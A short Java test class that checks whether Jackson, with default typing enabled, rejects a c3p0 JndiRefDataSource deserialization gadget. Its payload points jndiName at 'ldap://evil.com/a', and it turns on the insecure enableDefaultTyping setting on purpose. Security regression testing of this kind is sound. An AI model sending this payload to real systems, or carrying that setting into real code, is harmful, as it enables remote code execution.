
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.DeserializationFeature;

public class JacksonSecurityTest {

    public static void main(String[] args) {
        testDefaultTypingExploit();
    }

    public static void testDefaultTypingExploit() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);

        String payload = 
            "[\"com.mchange.v2.c3p0.JndiRefDataSource\", {\"jndiName\":\"ldap://evil.com/a\"}]";
        
        try {
            // Attempting to deserialize the payload - represents the exploit
            Object result = mapper.readValue(payload, Object.class);
            System.out.println("Unexpected success: " + result);
        } catch (Exception e) {
            // The expected result is an exception, since the classes should be blocked
            System.out.println("Successfully caught deserialization error: " + e.getMessage());
        }
    }
}
